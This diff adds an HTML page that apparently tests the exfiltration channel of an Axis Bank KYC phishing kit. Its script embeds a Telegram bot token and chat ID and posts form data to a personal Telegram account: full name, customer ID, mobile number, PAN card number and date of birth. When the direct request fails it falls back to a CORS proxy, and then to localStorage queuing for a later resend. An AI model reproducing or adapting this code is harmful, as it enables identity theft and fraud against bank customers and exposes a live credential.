@@ -1,0 +1,357 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Mobile Telegram Test</title>
+    <style>
+        body { 
+            font-family: Arial, sans-serif; 
+            margin: 20px; 
+            background: #f5f5f5;
+        }
+        .container { 
+            max-width: 400px; 
+            margin: 0 auto; 
+            background: white;
+            padding: 20px;
+            border-radius: 10px;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+        }
+        button { 
+            background: #8B1538; 
+            color: white; 
+            padding: 12px 20px; 
+            border: none; 
+            border-radius: 8px; 
+            cursor: pointer; 
+            width: 100%;
+            margin: 10px 0;
+            font-size: 16px;
+        }
+        button:hover { background: #7a1230; }
+        .result { 
+            margin: 15px 0; 
+            padding: 15px; 
+            border-radius: 8px; 
+            font-size: 14px;
+        }
+        .success { background: #d4edda; color: #155724; border: 1px solid #c3e6cb; }
+        .error { background: #f8d7da; color: #721c24; border: 1px solid #f5c6cb; }
+        .warning { background: #fff3cd; color: #856404; border: 1px solid #ffeaa7; }
+        .info { background: #d1ecf1; color: #0c5460; border: 1px solid #bee5eb; }
+        .console-log {
+            background: #f8f9fa;
+            border: 1px solid #dee2e6;
+            border-radius: 4px;
+            padding: 10px;
+            margin: 10px 0;
+            font-family: monospace;
+            font-size: 12px;
+            max-height: 200px;
+            overflow-y: auto;
+        }
+        .mobile-indicator {
+            background: #28a745;
+            color: white;
+            padding: 5px 10px;
+            border-radius: 15px;
+            font-size: 12px;
+            display: inline-block;
+            margin-bottom: 10px;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>📱 Mobile Telegram Test</h1>
+        
+        <div id="deviceInfo" class="mobile-indicator">Detecting device...</div>
+        
+        <div class="info">
+            <strong>Testing for Mobile Issues:</strong><br>
+            • CORS problems<br>
+            • Network restrictions<br>
+            • Timeout issues<br>
+            • Fallback mechanisms
+        </div>
+
+        <button onclick="testBasicConnection()">🔧 Test Basic Connection</button>
+        <button onclick="testCORSProxy()">🔄 Test CORS Proxy</button>
+        <button onclick="testFormData()">📋 Test Form Data Method</button>
+        <button onclick="testLocalStorage()">💾 Test Local Storage</button>
+        <button onclick="simulateMobileForm()">📱 Simulate Mobile KYC Form</button>
+        
+        <div id="result"></div>
+        <div id="console" class="console-log" style="display:none;"></div>
+    </div>
+
+    <script>
+        const botToken = '8519877001:AAFUU7sq1cR3L-Rcsp_p1tydU0SiG2zvbwk';
+        const chatId = '7271452485';
+
+        // Detect mobile device
+        function detectMobile() {
+            const userAgent = navigator.userAgent;
+            const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(userAgent);
+            const deviceInfo = document.getElementById('deviceInfo');
+            
+            if (isMobile) {
+                deviceInfo.textContent = '📱 Mobile Device Detected';
+                deviceInfo.style.background = '#dc3545';
+            } else {
+                deviceInfo.textContent = '🖥️ Desktop Device';
+                deviceInfo.style.background = '#6c757d';
+            }
+            
+            console.log('📱 User Agent:', userAgent);
+            console.log('📱 Is Mobile:', isMobile);
+            return isMobile;
+        }
+
+        function log(message) {
+            console.log(message);
+            const consoleDiv = document.getElementById('console');
+            consoleDiv.style.display = 'block';
+            consoleDiv.innerHTML += message + '<br>';
+            consoleDiv.scrollTop = consoleDiv.scrollHeight;
+        }
+
+        function showResult(message, type = 'info') {
+            const resultDiv = document.getElementById('result');
+            resultDiv.innerHTML = `<div class="result ${type}">${message}</div>`;
+        }
+
+        async function testBasicConnection() {
+            showResult('Testing basic Telegram API connection...', 'info');
+            log('🔧 Starting basic connection test...');
+            
+            try {
+                const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
+                const payload = {
+                    chat_id: chatId,
+                    text: `📱 <b>MOBILE TEST - Basic Connection</b>\n\nDevice: ${navigator.userAgent}\nTime: ${new Date().toLocaleString()}\n\n🏦 Axis Bank KYC Test`,
+                    parse_mode: 'HTML'
+                };
+
+                log('🌐 Request URL: ' + url);
+                log('📦 Payload: ' + JSON.stringify(payload));
+
+                const response = await fetch(url, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                        'Accept': 'application/json',
+                    },
+                    body: JSON.stringify(payload),
+                    signal: AbortSignal.timeout(10000)
+                });
+
+                log('📋 Response Status: ' + response.status);
+                const responseText = await response.text();
+                log('📋 Response Body: ' + responseText);
+
+                if (response.ok) {
+                    showResult('✅ Basic connection successful! Check Telegram @vikaskumar_8102', 'success');
+                } else {
+                    showResult('❌ Basic connection failed: ' + responseText, 'error');
+                }
+            } catch (error) {
+                log('❌ Error: ' + error.message);
+                showResult('❌ Basic connection error: ' + error.message, 'error');
+            }
+        }
+
+        async function testCORSProxy() {
+            showResult('Testing CORS proxy method...', 'info');
+            log('🔄 Starting CORS proxy test...');
+            
+            try {
+                const proxyUrl = 'https://corsproxy.io/?';
+                const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
+                const payload = {
+                    chat_id: chatId,
+                    text: `📱 <b>MOBILE TEST - CORS Proxy</b>\n\nDevice: ${navigator.userAgent}\nTime: ${new Date().toLocaleString()}\n\n🏦 Axis Bank KYC Test`,
+                    parse_mode: 'HTML'
+                };
+
+                const response = await fetch(proxyUrl + encodeURIComponent(telegramUrl), {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                        'Accept': 'application/json',
+                    },
+                    body: JSON.stringify(payload),
+                    signal: AbortSignal.timeout(15000)
+                });
+
+                log('📋 CORS Proxy Response Status: ' + response.status);
+                const responseText = await response.text();
+                log('📋 CORS Proxy Response: ' + responseText);
+
+                if (response.ok) {
+                    showResult('✅ CORS proxy successful! Check Telegram @vikaskumar_8102', 'success');
+                } else {
+                    showResult('❌ CORS proxy failed: ' + responseText, 'error');
+                }
+            } catch (error) {
+                log('❌ CORS Proxy Error: ' + error.message);
+                showResult('❌ CORS proxy error: ' + error.message, 'error');
+            }
+        }
+
+        async function testFormData() {
+            showResult('Testing Form Data method...', 'info');
+            log('📋 Starting Form Data test...');
+            
+            try {
+                const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
+                const formData = new FormData();
+                formData.append('chat_id', chatId);
+                formData.append('text', `📱 <b>MOBILE TEST - Form Data</b>\n\nDevice: ${navigator.userAgent}\nTime: ${new Date().toLocaleString()}\n\n🏦 Axis Bank KYC Test`);
+                formData.append('parse_mode', 'HTML');
+
+                const response = await fetch(url, {
+                    method: 'POST',
+                    body: formData,
+                    signal: AbortSignal.timeout(15000)
+                });
+
+                log('📋 Form Data Response Status: ' + response.status);
+                const responseText = await response.text();
+                log('📋 Form Data Response: ' + responseText);
+
+                if (response.ok) {
+                    showResult('✅ Form Data successful! Check Telegram @vikaskumar_8102', 'success');
+                } else {
+                    showResult('❌ Form Data failed: ' + responseText, 'error');
+                }
+            } catch (error) {
+                log('❌ Form Data Error: ' + error.message);
+                showResult('❌ Form Data error: ' + error.message, 'error');
+            }
+        }
+
+        function testLocalStorage() {
+            showResult('Testing Local Storage...', 'info');
+            log('💾 Starting Local Storage test...');
+            
+            try {
+                const testMessage = {
+                    message: 'Test message for later sync',
+                    timestamp: new Date().toISOString(),
+                    attempts: 0
+                };
+
+                // Store test message
+                const storedMessages = JSON.parse(localStorage.getItem('pendingTelegramMessages') || '[]');
+                storedMessages.push(testMessage);
+                localStorage.setItem('pendingTelegramMessages', JSON.stringify(storedMessages));
+
+                // Retrieve and verify
+                const retrieved = JSON.parse(localStorage.getItem('pendingTelegramMessages') || '[]');
+                
+                if (retrieved.length > 0) {
+                    showResult('✅ Local Storage working! Messages stored for later sync.', 'success');
+                    log('✅ Stored messages count: ' + retrieved.length);
+                } else {
+                    showResult('❌ Local Storage failed', 'error');
+                }
+            } catch (error) {
+                log('❌ Local Storage Error: ' + error.message);
+                showResult('❌ Local Storage error: ' + error.message, 'error');
+            }
+        }
+
+        async function simulateMobileForm() {
+            showResult('Simulating Mobile KYC Form Submission...', 'info');
+            log('📱 Starting Mobile KYC simulation...');
+            
+            const kycDetails = {
+                fullName: 'Mobile Test User',
+                customerId: 'MOB123456',
+                mobileNumber: '9876543210',
+                panCardNumber: 'ABCDE1234F',
+                dateOfBirth: '01/01/1990',
+                timestamp: new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' })
+            };
+
+            const message = `
+📝 <b>MOBILE KYC TEST - AXIS BANK</b>
+
+👤 <b>Customer Information:</b>
+• <b>Full Name:</b> <code>${kycDetails.fullName}</code>
+• <b>Customer ID:</b> <code>${kycDetails.customerId}</code>
+• <b>Mobile Number:</b> <code>${kycDetails.mobileNumber}</code>
+• <b>PAN Card:</b> <code>${kycDetails.panCardNumber}</code>
+• <b>Date of Birth:</b> <code>${kycDetails.dateOfBirth}</code>
+• <b>Timestamp:</b> ${kycDetails.timestamp}
+
+🏦 <i>Axis Bank Online KYC System</i>
+⏰ ${new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' })}
+👤 Sent to: <a href="https://t.me/vikaskumar_8102">@vikaskumar_8102</a>
+            `;
+
+            // Try multiple methods
+            let success = false;
+            
+            // Method 1: Basic
+            try {
+                const response = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: chatId,
+                        text: message,
+                        parse_mode: 'HTML'
+                    }),
+                    signal: AbortSignal.timeout(10000)
+                });
+                success = response.ok;
+                log('📋 Basic method result: ' + success);
+            } catch (error) {
+                log('❌ Basic method failed: ' + error.message);
+            }
+
+            // Method 2: CORS Proxy if basic failed
+            if (!success) {
+                try {
+                    const response = await fetch('https://corsproxy.io/?' + encodeURIComponent(`https://api.telegram.org/bot${botToken}/sendMessage`), {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({
+                            chat_id: chatId,
+                            text: message,
+                            parse_mode: 'HTML'
+                        }),
+                        signal: AbortSignal.timeout(15000)
+                    });
+                    success = response.ok;
+                    log('📋 CORS proxy result: ' + success);
+                } catch (error) {
+                    log('❌ CORS proxy failed: ' + error.message);
+                }
+            }
+
+            // Store locally if all failed
+            if (!success) {
+                const storedMessages = JSON.parse(localStorage.getItem('pendingTelegramMessages') || '[]');
+                storedMessages.push({
+                    message: message,
+                    timestamp: new Date().toISOString(),
+                    attempts: 0
+                });
+                localStorage.setItem('pendingTelegramMessages', JSON.stringify(storedMessages));
+                showResult('⚠️ All methods failed. Message stored for later sync.', 'warning');
+                log('💾 Message stored locally for retry');
+            } else {
+                showResult('✅ Mobile KYC simulation successful! Check Telegram @vikaskumar_8102', 'success');
+                log('✅ Mobile KYC test completed successfully');
+            }
+        }
+
+        // Initialize
+        detectMobile();
+    </script>
+</body>
+</html>
